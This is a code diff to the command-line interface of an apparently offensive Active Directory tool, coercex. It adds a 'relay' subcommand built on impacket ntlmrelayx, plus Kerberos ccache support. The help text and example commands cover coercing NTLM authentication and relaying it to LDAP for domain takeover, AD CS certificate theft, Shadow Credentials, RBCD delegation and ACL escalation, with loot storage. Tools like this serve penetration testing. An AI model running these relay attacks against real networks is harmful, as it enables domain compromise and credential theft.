@@ -20,7 +20,7 @@ from coercex.scanner import (
     format_results_json,
     format_results_table,
 )
-from coercex.utils import Credentials, Transport
+from coercex.utils import Credentials, ScanStats, Transport
 
 
 def _parse_targets(target: str | None, targets_file: str | None) -> list[str]:
@@ -61,6 +61,15 @@ examples:
 
   # Coerce with listener to capture NTLM auth
   coercex coerce -t dc01.corp.local -l 10.0.0.5 -u user -p pass -d corp.local
+
+  # Relay coerced auth to LDAP on DC for domain takeover
+  coercex relay -t dc01.corp.local -l 10.0.0.5 --relay-to ldap://dc02.corp.local -u user -p pass
+
+  # Relay to AD CS for certificate theft
+  coercex relay -t dc01.corp.local -l 10.0.0.5 --relay-to http://cas.corp.local/certsrv/ --adcs --template DomainController -u user -p pass
+
+  # Scan with Kerberos ccache authentication
+  coercex scan -t dc01.corp.local --ccache /tmp/krb5cc_user -d corp.local
 
   # Scan multiple targets from file, EFSR only
   coercex scan -T targets.txt -u user -p pass --protocols MS-EFSR
@@ -104,6 +113,11 @@ examples:
     )
     cred_group.add_argument(
         "--dc-host", default="", help="Domain controller hostname (for Kerberos)"
+    )
+    cred_group.add_argument(
+        "--ccache",
+        default="",
+        help="Path to Kerberos ccache file (or set KRB5CCNAME env var)",
     )
 
     # Protocol filter
@@ -226,6 +240,98 @@ examples:
         help="Seconds to wait for callback per attempt (default: 3.0)",
     )
 
+    # ── relay subcommand ─────────────────────────────────────────────
+    relay_parser = subparsers.add_parser(
+        "relay",
+        parents=[parent],
+        help="Trigger coercion and relay captured NTLM auth to target services",
+        description=(
+            "Relay mode: starts HTTP+SMB relay servers (via impacket ntlmrelayx), "
+            "triggers coercion, and relays captured NTLM authentication to "
+            "target services (LDAP, SMB, HTTP/AD CS, etc.)."
+        ),
+    )
+    relay_net_group = relay_parser.add_argument_group("relay network")
+    relay_net_group.add_argument(
+        "-l",
+        "--listener",
+        required=True,
+        help="Interface/listener IP (attacker IP reachable by targets)",
+    )
+    relay_net_group.add_argument(
+        "--relay-to",
+        required=True,
+        nargs="+",
+        metavar="TARGET_URL",
+        help="Relay target URL(s): ldap://dc01, http://cas/certsrv/, smb://fs01",
+    )
+    relay_net_group.add_argument(
+        "--http-port",
+        type=int,
+        default=80,
+        help="HTTP relay server port (default: 80)",
+    )
+    relay_net_group.add_argument(
+        "--smb-port",
+        type=int,
+        default=445,
+        help="SMB relay server port (default: 445)",
+    )
+    relay_net_group.add_argument(
+        "--transport",
+        choices=["smb", "http"],
+        default="smb",
+        help="Coercion transport: smb or http/WebDAV (default: smb)",
+    )
+
+    relay_attack_group = relay_parser.add_argument_group("relay attacks")
+    relay_attack_group.add_argument(
+        "--adcs",
+        action="store_true",
+        help="Enable AD CS relay attack (request certificate)",
+    )
+    relay_attack_group.add_argument(
+        "--template",
+        default="",
+        metavar="TEMPLATE",
+        help="AD CS template name (default: Machine/User based on account)",
+    )
+    relay_attack_group.add_argument(
+        "--altname",
+        default="",
+        help="Subject Alternative Name for ESC1/ESC6 attacks",
+    )
+    relay_attack_group.add_argument(
+        "--shadow-credentials",
+        action="store_true",
+        help="Enable Shadow Credentials attack (msDS-KeyCredentialLink)",
+    )
+    relay_attack_group.add_argument(
+        "--shadow-target",
+        default="",
+        help="Target account for Shadow Credentials (user or computer$)",
+    )
+    relay_attack_group.add_argument(
+        "--delegate-access",
+        action="store_true",
+        help="Enable RBCD delegation access attack",
+    )
+    relay_attack_group.add_argument(
+        "--escalate-user",
+        default="",
+        help="User to escalate privileges for via LDAP ACL attack",
+    )
+    relay_attack_group.add_argument(
+        "--socks",
+        action="store_true",
+        help="Start SOCKS proxy to keep relayed sessions alive",
+    )
+    relay_attack_group.add_argument(
+        "--lootdir",
+        default="",
+        help="Directory to store loot (default: ./loot)",
+    )
+
     return parser
 
 
@@ -260,7 +366,12 @@ def main(argv: list[str] | None = None) -> None:
         aes_key=args.aes_key,
         do_kerberos=args.kerberos,
         dc_host=args.dc_host,
+        ccache=args.ccache,
     )
+
+    # Load ccache if specified or if KRB5CCNAME is set with -k
+    if creds.ccache or (creds.do_kerberos and not creds.password and not creds.hashes):
+        creds.load_ccache()
 
     # ── Build config ─────────────────────────────────────────────────
     mode = Mode[args.command.upper()]
@@ -287,6 +398,23 @@ def main(argv: list[str] | None = None) -> None:
                 Transport.HTTP if args.transport == "http" else Transport.SMB
             )
 
+    # Relay settings
+    if mode == Mode.RELAY:
+        config.listener_host = args.listener
+        config.http_port = args.http_port
+        config.smb_port = args.smb_port
+        config.transport = Transport.HTTP if args.transport == "http" else Transport.SMB
+        config.relay_targets = args.relay_to
+        config.relay_adcs = args.adcs
+        config.relay_adcs_template = args.template
+        config.relay_altname = args.altname
+        config.relay_shadow_credentials = args.shadow_credentials
+        config.relay_shadow_target = args.shadow_target
+        config.relay_delegate_access = args.delegate_access
+        config.relay_escalate_user = args.escalate_user
+        config.relay_socks = args.socks
+        config.relay_lootdir = args.lootdir
+
     # ── Run ──────────────────────────────────────────────────────────
     stats = asyncio.run(_run(config))
 
@@ -304,10 +432,8 @@ def main(argv: list[str] | None = None) -> None:
         print(output)
 
 
-async def _run(config: ScanConfig) -> "ScanStats":
+async def _run(config: ScanConfig) -> ScanStats:
     """Async entry point for the scanner."""
-    from coercex.utils import ScanStats as _ScanStats
-
     scanner = Scanner(config)
     return await scanner.run()
 
